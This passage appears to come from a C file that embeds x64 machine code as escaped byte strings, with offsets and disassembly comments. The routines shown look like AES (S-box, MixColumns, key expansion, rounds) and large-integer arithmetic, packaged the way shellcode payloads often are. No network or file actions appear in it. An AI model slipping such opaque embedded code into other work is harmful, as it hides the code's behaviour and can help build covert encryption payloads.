  /* 14F2 */ "\x48\x83\xc4\x28"                         /* add rsp, 0x28                      */
  /* 14F6 */ "\xe9\x49\xff\xff\xff"                     /* jmp 0x1444                         */
  /* 14FB */ "\xcc"                                     /* int3                               */
  /* 14FC */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 1501 */ "\x48\x89\x74\x24\x10"                     /* mov [rsp+0x10], rsi                */
  /* 1506 */ "\x57"                                     /* push rdi                           */
  /* 1507 */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 150B */ "\x33\xdb"                                 /* xor ebx, ebx                       */
  /* 150D */ "\x8b\xf9"                                 /* mov edi, ecx                       */
  /* 150F */ "\x8d\x73\x04"                             /* lea esi, [rbx+0x4]                 */
  /* 1512 */ "\x40\x8a\xcf"                             /* mov cl, dil                        */
  /* 1515 */ "\xe8\x2a\xff\xff\xff"                     /* call 0x1444                        */
  /* 151A */ "\xba\x04\x00\x00\x00"                     /* mov edx, 0x4                       */
  /* 151F */ "\x8a\xc8"                                 /* mov cl, al                         */
  /* 1521 */ "\xd0\xc0"                                 /* rol al, 1                          */
  /* 1523 */ "\x32\xc8"                                 /* xor cl, al                         */
  /* 1525 */ "\x48\xff\xca"                             /* dec rdx                            */
  /* 1528 */ "\x75\xf7"                                 /* jnz 0x1521                         */
  /* 152A */ "\x0f\xb6\xc1"                             /* movzx eax, cl                      */
  /* 152D */ "\xc1\xef\x08"                             /* shr edi, 0x8                       */
  /* 1530 */ "\x83\xf0\x63"                             /* xor eax, 0x63                      */
  /* 1533 */ "\x0b\xd8"                                 /* or ebx, eax                        */
  /* 1535 */ "\xc1\xcb\x08"                             /* ror ebx, 0x8                       */
  /* 1538 */ "\x48\xff\xce"                             /* dec rsi                            */
  /* 153B */ "\x75\xd5"                                 /* jnz 0x1512                         */
  /* 153D */ "\x48\x8b\x74\x24\x38"                     /* mov rsi, [rsp+0x38]                */
  /* 1542 */ "\x8b\xc3"                                 /* mov eax, ebx                       */
  /* 1544 */ "\x48\x8b\x5c\x24\x30"                     /* mov rbx, [rsp+0x30]                */
  /* 1549 */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 154D */ "\x5f"                                     /* pop rdi                            */
  /* 154E */ "\xc3"                                     /* ret                                */
  /* 154F */ "\xcc"                                     /* int3                               */
  /* 1550 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 1555 */ "\x48\x89\x74\x24\x10"                     /* mov [rsp+0x10], rsi                */
  /* 155A */ "\x57"                                     /* push rdi                           */
  /* 155B */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 155F */ "\x8b\xf2"                                 /* mov esi, edx                       */
  /* 1561 */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 1564 */ "\xbf\x10\x00\x00\x00"                     /* mov edi, 0x10                      */
  /* 1569 */ "\x8a\x0b"                                 /* mov cl, [rbx]                      */
  /* 156B */ "\x8b\xd6"                                 /* mov edx, esi                       */
  /* 156D */ "\xe8\x3e\xff\xff\xff"                     /* call 0x14b0                        */
  /* 1572 */ "\x88\x03"                                 /* mov [rbx], al                      */
  /* 1574 */ "\x48\xff\xc3"                             /* inc rbx                            */
  /* 1577 */ "\x48\xff\xcf"                             /* dec rdi                            */
  /* 157A */ "\x75\xed"                                 /* jnz 0x1569                         */
  /* 157C */ "\x48\x8b\x5c\x24\x30"                     /* mov rbx, [rsp+0x30]                */
  /* 1581 */ "\x48\x8b\x74\x24\x38"                     /* mov rsi, [rsp+0x38]                */
  /* 1586 */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 158A */ "\x5f"                                     /* pop rdi                            */
  /* 158B */ "\xc3"                                     /* ret                                */
  /* 158C */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 1591 */ "\x45\x33\xc0"                             /* xor r8d, r8d                       */
  /* 1594 */ "\x8b\xda"                                 /* mov ebx, edx                       */
  /* 1596 */ "\x4c\x8b\xd9"                             /* mov r11, rcx                       */
  /* 1599 */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 159C */ "\x33\xd2"                                 /* xor edx, edx                       */
  /* 159E */ "\x41\x83\xf8\x10"                         /* cmp r8d, 0x10                      */
  /* 15A2 */ "\x73\x22"                                 /* jae 0x15c6                         */
  /* 15A4 */ "\x44\x8d\x52\x0f"                         /* lea r10d, [rdx+0xf]                */
  /* 15A8 */ "\x49\x8b\xcb"                             /* mov rcx, r11                       */
  /* 15AB */ "\x45\x2b\xd0"                             /* sub r10d, r8d                      */
  /* 15AE */ "\x41\xc1\xea\x02"                         /* shr r10d, 0x2                      */
  /* 15B2 */ "\x41\xff\xc2"                             /* inc r10d                           */
  /* 15B5 */ "\x0f\xb6\x01"                             /* movzx eax, byte [rcx]              */
  /* 15B8 */ "\x48\x83\xc1\x04"                         /* add rcx, 0x4                       */
  /* 15BC */ "\x0b\xd0"                                 /* or edx, eax                        */
  /* 15BE */ "\xc1\xca\x08"                             /* ror edx, 0x8                       */
  /* 15C1 */ "\x49\xff\xca"                             /* dec r10                            */
  /* 15C4 */ "\x75\xef"                                 /* jnz 0x15b5                         */
  /* 15C6 */ "\x83\xfb\x01"                             /* cmp ebx, 0x1                       */
  /* 15C9 */ "\x75\x08"                                 /* jnz 0x15d3                         */
  /* 15CB */ "\x8d\x4b\x1f"                             /* lea ecx, [rbx+0x1f]                */
  /* 15CE */ "\x41\x2b\xc9"                             /* sub ecx, r9d                       */
  /* 15D1 */ "\xeb\x03"                                 /* jmp 0x15d6                         */
  /* 15D3 */ "\x41\x8b\xc9"                             /* mov ecx, r9d                       */
  /* 15D6 */ "\xd3\xc2"                                 /* rol edx, cl                        */
  /* 15D8 */ "\x41\x83\xf8\x10"                         /* cmp r8d, 0x10                      */
  /* 15DC */ "\x73\x21"                                 /* jae 0x15ff                         */
  /* 15DE */ "\x41\xba\x0f\x00\x00\x00"                 /* mov r10d, 0xf                      */
  /* 15E4 */ "\x49\x8b\xcb"                             /* mov rcx, r11                       */
  /* 15E7 */ "\x45\x2b\xd0"                             /* sub r10d, r8d                      */
  /* 15EA */ "\x41\xc1\xea\x02"                         /* shr r10d, 0x2                      */
  /* 15EE */ "\x41\xff\xc2"                             /* inc r10d                           */
  /* 15F1 */ "\x88\x11"                                 /* mov [rcx], dl                      */
  /* 15F3 */ "\xc1\xea\x08"                             /* shr edx, 0x8                       */
  /* 15F6 */ "\x48\x83\xc1\x04"                         /* add rcx, 0x4                       */
  /* 15FA */ "\x49\xff\xca"                             /* dec r10                            */
  /* 15FD */ "\x75\xf2"                                 /* jnz 0x15f1                         */
  /* 15FF */ "\x41\x83\xc1\x08"                         /* add r9d, 0x8                       */
  /* 1603 */ "\x41\xff\xc0"                             /* inc r8d                            */
  /* 1606 */ "\x49\xff\xc3"                             /* inc r11                            */
  /* 1609 */ "\x41\x83\xf9\x20"                         /* cmp r9d, 0x20                      */
  /* 160D */ "\x72\x8d"                                 /* jb 0x159c                          */
  /* 160F */ "\x48\x8b\x5c\x24\x08"                     /* mov rbx, [rsp+0x8]                 */
  /* 1614 */ "\xc3"                                     /* ret                                */
  /* 1615 */ "\xcc"                                     /* int3                               */
  /* 1616 */ "\xcc"                                     /* int3                               */
  /* 1617 */ "\xcc"                                     /* int3                               */
  /* 1618 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 161D */ "\x48\x89\x7c\x24\x10"                     /* mov [rsp+0x10], rdi                */
  /* 1622 */ "\x8b\xda"                                 /* mov ebx, edx                       */
  /* 1624 */ "\x4c\x8b\xd1"                             /* mov r10, rcx                       */
  /* 1627 */ "\xbf\x04\x00\x00\x00"                     /* mov edi, 0x4                       */
  /* 162C */ "\x45\x8b\x1a"                             /* mov r11d, [r10]                    */
  /* 162F */ "\x85\xdb"                                 /* test ebx, ebx                      */
  /* 1631 */ "\x75\x38"                                 /* jnz 0x166b                         */
  /* 1633 */ "\x41\x8b\xc3"                             /* mov eax, r11d                      */
  /* 1636 */ "\xc1\xc0\x10"                             /* rol eax, 0x10                      */
  /* 1639 */ "\x41\x33\xc3"                             /* xor eax, r11d                      */
  /* 163C */ "\x8b\xc8"                                 /* mov ecx, eax                       */
  /* 163E */ "\x81\xe1\x80\x80\x80\x80"                 /* and ecx, 0x80808080                */
  /* 1644 */ "\x8b\xd1"                                 /* mov edx, ecx                       */
  /* 1646 */ "\xc1\xe9\x07"                             /* shr ecx, 0x7                       */
  /* 1649 */ "\x33\xd0"                                 /* xor edx, eax                       */
  /* 164B */ "\x03\xd2"                                 /* add edx, edx                       */
  /* 164D */ "\x6b\xc9\x1b"                             /* imul ecx, ecx, 0x1b                */
  /* 1650 */ "\x33\xd1"                                 /* xor edx, ecx                       */
  /* 1652 */ "\x8b\xca"                                 /* mov ecx, edx                       */
  /* 1654 */ "\x81\xe1\x80\x80\x80\x80"                 /* and ecx, 0x80808080                */
  /* 165A */ "\x8b\xc1"                                 /* mov eax, ecx                       */
  /* 165C */ "\xc1\xe9\x07"                             /* shr ecx, 0x7                       */
  /* 165F */ "\x33\xc2"                                 /* xor eax, edx                       */
  /* 1661 */ "\x03\xc0"                                 /* add eax, eax                       */
  /* 1663 */ "\x6b\xc9\x1b"                             /* imul ecx, ecx, 0x1b                */
  /* 1666 */ "\x33\xc1"                                 /* xor eax, ecx                       */
  /* 1668 */ "\x44\x33\xd8"                             /* xor r11d, eax                      */
  /* 166B */ "\x45\x8b\xcb"                             /* mov r9d, r11d                      */
  /* 166E */ "\x45\x8b\xc3"                             /* mov r8d, r11d                      */
  /* 1671 */ "\x41\xc1\xc9\x08"                         /* ror r9d, 0x8                       */
  /* 1675 */ "\x41\x8b\xc9"                             /* mov ecx, r9d                       */
  /* 1678 */ "\x41\x33\xcb"                             /* xor ecx, r11d                      */
  /* 167B */ "\x8b\xd1"                                 /* mov edx, ecx                       */
  /* 167D */ "\x81\xe2\x80\x80\x80\x80"                 /* and edx, 0x80808080                */
  /* 1683 */ "\x41\xc1\xc0\x10"                         /* rol r8d, 0x10                      */
  /* 1687 */ "\x41\xc1\xc3\x08"                         /* rol r11d, 0x8                      */
  /* 168B */ "\x45\x33\xc3"                             /* xor r8d, r11d                      */
  /* 168E */ "\x8b\xc2"                                 /* mov eax, edx                       */
  /* 1690 */ "\xc1\xea\x07"                             /* shr edx, 0x7                       */
  /* 1693 */ "\x33\xc1"                                 /* xor eax, ecx                       */
  /* 1695 */ "\x03\xc0"                                 /* add eax, eax                       */
  /* 1697 */ "\x44\x33\xc0"                             /* xor r8d, eax                       */
  /* 169A */ "\x6b\xd2\x1b"                             /* imul edx, edx, 0x1b                */
  /* 169D */ "\x44\x33\xc2"                             /* xor r8d, edx                       */
  /* 16A0 */ "\x45\x33\xc1"                             /* xor r8d, r9d                       */
  /* 16A3 */ "\x45\x89\x02"                             /* mov [r10], r8d                     */
  /* 16A6 */ "\x49\x83\xc2\x04"                         /* add r10, 0x4                       */
  /* 16AA */ "\x48\xff\xcf"                             /* dec rdi                            */
  /* 16AD */ "\x0f\x85\x79\xff\xff\xff"                 /* jnz 0x162c                         */
  /* 16B3 */ "\x48\x8b\x5c\x24\x08"                     /* mov rbx, [rsp+0x8]                 */
  /* 16B8 */ "\x48\x8b\x7c\x24\x10"                     /* mov rdi, [rsp+0x10]                */
  /* 16BD */ "\xc3"                                     /* ret                                */
  /* 16BE */ "\xcc"                                     /* int3                               */
  /* 16BF */ "\xcc"                                     /* int3                               */
  /* 16C0 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 16C5 */ "\x48\x89\x6c\x24\x10"                     /* mov [rsp+0x10], rbp                */
  /* 16CA */ "\x48\x89\x74\x24\x18"                     /* mov [rsp+0x18], rsi                */
  /* 16CF */ "\x57"                                     /* push rdi                           */
  /* 16D0 */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 16D4 */ "\x48\x8b\xf1"                             /* mov rsi, rcx                       */
  /* 16D7 */ "\x48\x8b\xfa"                             /* mov rdi, rdx                       */
  /* 16DA */ "\xb9\x20\x00\x00\x00"                     /* mov ecx, 0x20                      */
  /* 16DF */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 16E1 */ "\x48\x8b\xda"                             /* mov rbx, rdx                       */
  /* 16E4 */ "\x40\xb5\x01"                             /* mov bpl, 0x1                       */
  /* 16E7 */ "\xbf\x08\x00\x00\x00"                     /* mov edi, 0x8                       */
  /* 16EC */ "\x8b\x53\x1c"                             /* mov edx, [rbx+0x1c]                */
  /* 16EF */ "\x8b\xc7"                                 /* mov eax, edi                       */
  /* 16F1 */ "\x25\x07\x00\x00\x80"                     /* and eax, 0x80000007                */
  /* 16F6 */ "\x7d\x07"                                 /* jge 0x16ff                         */
  /* 16F8 */ "\xff\xc8"                                 /* dec eax                            */
  /* 16FA */ "\x83\xc8\xf8"                             /* or eax, 0xfffffff8                 */
  /* 16FD */ "\xff\xc0"                                 /* inc eax                            */
  /* 16FF */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 1701 */ "\x75\x2c"                                 /* jnz 0x172f                         */
  /* 1703 */ "\xc1\xca\x08"                             /* ror edx, 0x8                       */
  /* 1706 */ "\x40\x0f\xb6\xed"                         /* movzx ebp, bpl                     */
  /* 170A */ "\x8b\xca"                                 /* mov ecx, edx                       */
  /* 170C */ "\xe8\xeb\xfd\xff\xff"                     /* call 0x14fc                        */
  /* 1711 */ "\x8b\xcd"                                 /* mov ecx, ebp                       */
  /* 1713 */ "\x8b\xd0"                                 /* mov edx, eax                       */
  /* 1715 */ "\x81\xe1\x80\x80\x80\x80"                 /* and ecx, 0x80808080                */
  /* 171B */ "\xb0\x1b"                                 /* mov al, 0x1b                       */
  /* 171D */ "\x33\xd5"                                 /* xor edx, ebp                       */
  /* 171F */ "\x40\x32\xe9"                             /* xor bpl, cl                        */
  /* 1722 */ "\xc1\xe9\x07"                             /* shr ecx, 0x7                       */
  /* 1725 */ "\x40\x02\xed"                             /* add bpl, bpl                       */
  /* 1728 */ "\xf6\xe9"                                 /* imul cl                            */
  /* 172A */ "\x40\x32\xe8"                             /* xor bpl, al                        */
  /* 172D */ "\xeb\x0e"                                 /* jmp 0x173d                         */
  /* 172F */ "\x83\xf8\x04"                             /* cmp eax, 0x4                       */
  /* 1732 */ "\x75\x09"                                 /* jnz 0x173d                         */
  /* 1734 */ "\x8b\xca"                                 /* mov ecx, edx                       */
  /* 1736 */ "\xe8\xc1\xfd\xff\xff"                     /* call 0x14fc                        */
  /* 173B */ "\x8b\xd0"                                 /* mov edx, eax                       */
  /* 173D */ "\x33\x13"                                 /* xor edx, [rbx]                     */
  /* 173F */ "\xff\xc7"                                 /* inc edi                            */
  /* 1741 */ "\x48\x83\xc3\x04"                         /* add rbx, 0x4                       */
  /* 1745 */ "\x89\x53\x1c"                             /* mov [rbx+0x1c], edx                */
  /* 1748 */ "\x83\xff\x3c"                             /* cmp edi, 0x3c                      */
  /* 174B */ "\x7c\x9f"                                 /* jl 0x16ec                          */
  /* 174D */ "\x48\x8b\x5c\x24\x30"                     /* mov rbx, [rsp+0x30]                */
  /* 1752 */ "\x48\x8b\x6c\x24\x38"                     /* mov rbp, [rsp+0x38]                */
  /* 1757 */ "\x48\x8b\x74\x24\x40"                     /* mov rsi, [rsp+0x40]                */
  /* 175C */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 1760 */ "\x5f"                                     /* pop rdi                            */
  /* 1761 */ "\xc3"                                     /* ret                                */
  /* 1762 */ "\xcc"                                     /* int3                               */
  /* 1763 */ "\xcc"                                     /* int3                               */
  /* 1764 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 1769 */ "\x48\x89\x74\x24\x10"                     /* mov [rsp+0x10], rsi                */
  /* 176E */ "\x48\x89\x7c\x24\x18"                     /* mov [rsp+0x18], rdi                */
  /* 1773 */ "\x55"                                     /* push rbp                           */
  /* 1774 */ "\x41\x54"                                 /* push r12                           */
  /* 1776 */ "\x41\x55"                                 /* push r13                           */
  /* 1778 */ "\x41\x56"                                 /* push r14                           */
  /* 177A */ "\x41\x57"                                 /* push r15                           */
  /* 177C */ "\x48\x8b\xec"                             /* mov rbp, rsp                       */
  /* 177F */ "\x48\x83\xec\x30"                         /* sub rsp, 0x30                      */
  /* 1783 */ "\x41\xbf\x10\x00\x00\x00"                 /* mov r15d, 0x10                     */
  /* 1789 */ "\x48\x8b\xf1"                             /* mov rsi, rcx                       */
  /* 178C */ "\x48\x8d\x7d\xf0"                         /* lea rdi, [rbp-0x10]                */
  /* 1790 */ "\x45\x8d\x77\xf1"                         /* lea r14d, [r15-0xf]                */
  /* 1794 */ "\x41\x8b\xcf"                             /* mov ecx, r15d                      */
  /* 1797 */ "\x41\x8b\xd9"                             /* mov ebx, r9d                       */
  /* 179A */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 179C */ "\x4d\x8b\xe0"                             /* mov r12, r8                        */
  /* 179F */ "\x4c\x8b\xea"                             /* mov r13, rdx                       */
  /* 17A2 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 17A6 */ "\x48\x8d\x45\xf0"                         /* lea rax, [rbp-0x10]                */
  /* 17AA */ "\x41\x8b\xff"                             /* mov edi, r15d                      */
  /* 17AD */ "\x45\x3b\xce"                             /* cmp r9d, r14d                      */
  /* 17B0 */ "\x75\x6d"                                 /* jnz 0x181f                         */
  /* 17B2 */ "\x49\x8b\xd0"                             /* mov rdx, r8                        */
  /* 17B5 */ "\x48\x2b\xd0"                             /* sub rdx, rax                       */
  /* 17B8 */ "\x8a\x04\x0a"                             /* mov al, [rdx+rcx]                  */
  /* 17BB */ "\x30\x01"                                 /* xor [rcx], al                      */
  /* 17BD */ "\x49\x03\xce"                             /* add rcx, r14                       */
  /* 17C0 */ "\x49\x2b\xfe"                             /* sub rdi, r14                       */
  /* 17C3 */ "\x75\xf3"                                 /* jnz 0x17b8                         */
  /* 17C5 */ "\x41\x8a\xfe"                             /* mov dil, r14b                      */
  /* 17C8 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 17CC */ "\x41\x8b\xd6"                             /* mov edx, r14d                      */
  /* 17CF */ "\xe8\x7c\xfd\xff\xff"                     /* call 0x1550                        */
  /* 17D4 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 17D8 */ "\x41\x8b\xd6"                             /* mov edx, r14d                      */
  /* 17DB */ "\xe8\xac\xfd\xff\xff"                     /* call 0x158c                        */
  /* 17E0 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 17E4 */ "\x41\x8b\xd6"                             /* mov edx, r14d                      */
  /* 17E7 */ "\xe8\x2c\xfe\xff\xff"                     /* call 0x1618                        */
  /* 17EC */ "\x40\x0f\xb6\xc7"                         /* movzx eax, dil                     */
  /* 17F0 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 17F4 */ "\xc1\xe0\x02"                             /* shl eax, 0x2                       */
  /* 17F7 */ "\x49\x8b\xd7"                             /* mov rdx, r15                       */
  /* 17FA */ "\x48\x98"                                 /* cdqe                               */
  /* 17FC */ "\x49\x8d\x34\x84"                         /* lea rsi, [r12+rax*4]               */
  /* 1800 */ "\x48\x8d\x45\xf0"                         /* lea rax, [rbp-0x10]                */
  /* 1804 */ "\x48\x2b\xf0"                             /* sub rsi, rax                       */
  /* 1807 */ "\x8a\x04\x0e"                             /* mov al, [rsi+rcx]                  */
  /* 180A */ "\x30\x01"                                 /* xor [rcx], al                      */
  /* 180C */ "\x49\x03\xce"                             /* add rcx, r14                       */
  /* 180F */ "\x49\x2b\xd6"                             /* sub rdx, r14                       */
  /* 1812 */ "\x75\xf3"                                 /* jnz 0x1807                         */
  /* 1814 */ "\x41\x02\xfe"                             /* add dil, r14b                      */
  /* 1817 */ "\x40\x80\xff\x0e"                         /* cmp dil, 0xe                       */
  /* 181B */ "\x72\xab"                                 /* jb 0x17c8                          */
  /* 181D */ "\xeb\x68"                                 /* jmp 0x1887                         */
  /* 181F */ "\x49\x8d\x90\xe0\x00\x00\x00"             /* lea rdx, [r8+0xe0]                 */
  /* 1826 */ "\x48\x2b\xd0"                             /* sub rdx, rax                       */
  /* 1829 */ "\x8a\x04\x0a"                             /* mov al, [rdx+rcx]                  */
  /* 182C */ "\x30\x01"                                 /* xor [rcx], al                      */
  /* 182E */ "\x49\x03\xce"                             /* add rcx, r14                       */
  /* 1831 */ "\x49\x2b\xfe"                             /* sub rdi, r14                       */
  /* 1834 */ "\x75\xf3"                                 /* jnz 0x1829                         */
  /* 1836 */ "\x40\xb7\x0d"                             /* mov dil, 0xd                       */
  /* 1839 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 183D */ "\x8b\xd3"                                 /* mov edx, ebx                       */
  /* 183F */ "\xe8\x0c\xfd\xff\xff"                     /* call 0x1550                        */
  /* 1844 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 1848 */ "\x8b\xd3"                                 /* mov edx, ebx                       */
  /* 184A */ "\xe8\x3d\xfd\xff\xff"                     /* call 0x158c                        */
  /* 184F */ "\x40\x0f\xb6\xc7"                         /* movzx eax, dil                     */
  /* 1853 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 1857 */ "\xc1\xe0\x02"                             /* shl eax, 0x2                       */
  /* 185A */ "\x49\x8b\xd7"                             /* mov rdx, r15                       */
  /* 185D */ "\x48\x98"                                 /* cdqe                               */
  /* 185F */ "\x49\x8d\x34\x84"                         /* lea rsi, [r12+rax*4]               */
  /* 1863 */ "\x48\x8d\x45\xf0"                         /* lea rax, [rbp-0x10]                */
  /* 1867 */ "\x48\x2b\xf0"                             /* sub rsi, rax                       */
  /* 186A */ "\x8a\x04\x0e"                             /* mov al, [rsi+rcx]                  */
  /* 186D */ "\x30\x01"                                 /* xor [rcx], al                      */
  /* 186F */ "\x49\x03\xce"                             /* add rcx, r14                       */
  /* 1872 */ "\x49\x2b\xd6"                             /* sub rdx, r14                       */
  /* 1875 */ "\x75\xf3"                                 /* jnz 0x186a                         */
  /* 1877 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 187B */ "\x8b\xd3"                                 /* mov edx, ebx                       */
  /* 187D */ "\xe8\x96\xfd\xff\xff"                     /* call 0x1618                        */
  /* 1882 */ "\x40\xfe\xcf"                             /* dec dil                            */
  /* 1885 */ "\x75\xb2"                                 /* jnz 0x1839                         */
  /* 1887 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 188B */ "\x8b\xd3"                                 /* mov edx, ebx                       */
  /* 188D */ "\xe8\xbe\xfc\xff\xff"                     /* call 0x1550                        */
  /* 1892 */ "\x48\x8d\x4d\xf0"                         /* lea rcx, [rbp-0x10]                */
  /* 1896 */ "\x8b\xd3"                                 /* mov edx, ebx                       */
  /* 1898 */ "\xe8\xef\xfc\xff\xff"                     /* call 0x158c                        */
  /* 189D */ "\x40\x0f\xb6\xc7"                         /* movzx eax, dil                     */
  /* 18A1 */ "\x48\x8d\x55\xf0"                         /* lea rdx, [rbp-0x10]                */
  /* 18A5 */ "\xc1\xe0\x02"                             /* shl eax, 0x2                       */
  /* 18A8 */ "\x49\x8b\xcf"                             /* mov rcx, r15                       */
  /* 18AB */ "\x48\x98"                                 /* cdqe                               */
  /* 18AD */ "\x49\x8d\x3c\x84"                         /* lea rdi, [r12+rax*4]               */
  /* 18B1 */ "\x48\x8d\x45\xf0"                         /* lea rax, [rbp-0x10]                */
  /* 18B5 */ "\x48\x2b\xf8"                             /* sub rdi, rax                       */
  /* 18B8 */ "\x8a\x04\x17"                             /* mov al, [rdi+rdx]                  */
  /* 18BB */ "\x30\x02"                                 /* xor [rdx], al                      */
  /* 18BD */ "\x49\x03\xd6"                             /* add rdx, r14                       */
  /* 18C0 */ "\x49\x2b\xce"                             /* sub rcx, r14                       */
  /* 18C3 */ "\x75\xf3"                                 /* jnz 0x18b8                         */
  /* 18C5 */ "\x48\x8b\x5c\x24\x60"                     /* mov rbx, [rsp+0x60]                */
  /* 18CA */ "\x48\x8d\x75\xf0"                         /* lea rsi, [rbp-0x10]                */
  /* 18CE */ "\x49\x8b\xfd"                             /* mov rdi, r13                       */
  /* 18D1 */ "\x49\x8b\xcf"                             /* mov rcx, r15                       */
  /* 18D4 */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 18D6 */ "\x48\x8b\x74\x24\x68"                     /* mov rsi, [rsp+0x68]                */
  /* 18DB */ "\x48\x8b\x7c\x24\x70"                     /* mov rdi, [rsp+0x70]                */
  /* 18E0 */ "\x48\x83\xc4\x30"                         /* add rsp, 0x30                      */
  /* 18E4 */ "\x41\x5f"                                 /* pop r15                            */
  /* 18E6 */ "\x41\x5e"                                 /* pop r14                            */
  /* 18E8 */ "\x41\x5d"                                 /* pop r13                            */
  /* 18EA */ "\x41\x5c"                                 /* pop r12                            */
  /* 18EC */ "\x5d"                                     /* pop rbp                            */
  /* 18ED */ "\xc3"                                     /* ret                                */
  /* 18EE */ "\xcc"                                     /* int3                               */
  /* 18EF */ "\xcc"                                     /* int3                               */
  /* 18F0 */ "\x41\xb8\xff\x1f\x00\x00"                 /* mov r8d, 0x1fff                    */
  /* 18F6 */ "\x41\x8b\xc0"                             /* mov eax, r8d                       */
  /* 18F9 */ "\x41\x8b\xd0"                             /* mov edx, r8d                       */
  /* 18FC */ "\x48\xc1\xe8\x05"                         /* shr rax, 0x5                       */
  /* 1900 */ "\x83\xe2\x1f"                             /* and edx, 0x1f                      */
  /* 1903 */ "\x8b\x04\x81"                             /* mov eax, [rcx+rax*4]               */
  /* 1906 */ "\x0f\xa3\xd0"                             /* bt eax, edx                        */
  /* 1909 */ "\x72\x05"                                 /* jb 0x1910                          */
  /* 190B */ "\x41\xff\xc8"                             /* dec r8d                            */
  /* 190E */ "\x79\xe6"                                 /* jns 0x18f6                         */
  /* 1910 */ "\x41\x8d\x40\x01"                         /* lea eax, [r8+0x1]                  */
  /* 1914 */ "\xc3"                                     /* ret                                */
  /* 1915 */ "\xcc"                                     /* int3                               */
  /* 1916 */ "\xcc"                                     /* int3                               */
  /* 1917 */ "\xcc"                                     /* int3                               */
  /* 1918 */ "\x48\x89\x7c\x24\x08"                     /* mov [rsp+0x8], rdi                 */
  /* 191D */ "\x48\x8b\xf9"                             /* mov rdi, rcx                       */
  /* 1920 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 1922 */ "\xb9\x04\x04\x00\x00"                     /* mov ecx, 0x404                     */
  /* 1927 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1929 */ "\x48\x8b\x7c\x24\x08"                     /* mov rdi, [rsp+0x8]                 */
  /* 192E */ "\xc3"                                     /* ret                                */
  /* 192F */ "\xcc"                                     /* int3                               */
  /* 1930 */ "\x48\x89\x74\x24\x08"                     /* mov [rsp+0x8], rsi                 */
  /* 1935 */ "\x57"                                     /* push rdi                           */
  /* 1936 */ "\xb8\x00\x20\x00\x00"                     /* mov eax, 0x2000                    */
  /* 193B */ "\xe8\xa0\x03\x00\x00"                     /* call 0x1ce0                        */
  /* 1940 */ "\x48\x2b\xe0"                             /* sub rsp, rax                       */
  /* 1943 */ "\x4c\x8b\xc9"                             /* mov r9, rcx                        */
  /* 1946 */ "\x48\x8b\xf2"                             /* mov rsi, rdx                       */
  /* 1949 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 194B */ "\x41\xbb\x04\x04\x00\x00"                 /* mov r11d, 0x404                    */
  /* 1951 */ "\x48\x8d\x3c\x24"                         /* lea rdi, [rsp]                     */
  /* 1955 */ "\x4c\x8d\x14\x24"                         /* lea r10, [rsp]                     */
  /* 1959 */ "\x41\x8b\xcb"                             /* mov ecx, r11d                      */
  /* 195C */ "\x33\xd2"                                 /* xor edx, edx                       */
  /* 195E */ "\x49\x2b\xf0"                             /* sub rsi, r8                        */
  /* 1961 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1963 */ "\xbf\x00\x01\x00\x00"                     /* mov edi, 0x100                     */
  /* 1968 */ "\x4d\x2b\xd0"                             /* sub r10, r8                        */
  /* 196B */ "\x42\x8b\x04\x06"                         /* mov eax, [rsi+r8]                  */
  /* 196F */ "\x8b\xca"                                 /* mov ecx, edx                       */
  /* 1971 */ "\x33\xd2"                                 /* xor edx, edx                       */
  /* 1973 */ "\x48\x03\xc1"                             /* add rax, rcx                       */
  /* 1976 */ "\x41\x8b\x08"                             /* mov ecx, [r8]                      */
  /* 1979 */ "\x48\x03\xc1"                             /* add rax, rcx                       */
  /* 197C */ "\x43\x89\x04\x02"                         /* mov [r10+r8], eax                  */
  /* 1980 */ "\x48\xc1\xe8\x20"                         /* shr rax, 0x20                      */
  /* 1984 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 1986 */ "\x0f\x95\xc2"                             /* setnz dl                           */
  /* 1989 */ "\x49\x83\xc0\x04"                         /* add r8, 0x4                        */
  /* 198D */ "\x48\xff\xcf"                             /* dec rdi                            */
  /* 1990 */ "\x75\xd9"                                 /* jnz 0x196b                         */
  /* 1992 */ "\x49\x8b\xf9"                             /* mov rdi, r9                        */
  /* 1995 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 1997 */ "\x49\x8b\xcb"                             /* mov rcx, r11                       */
  /* 199A */ "\xf3\xaa"                                 /* rep stosb                          */
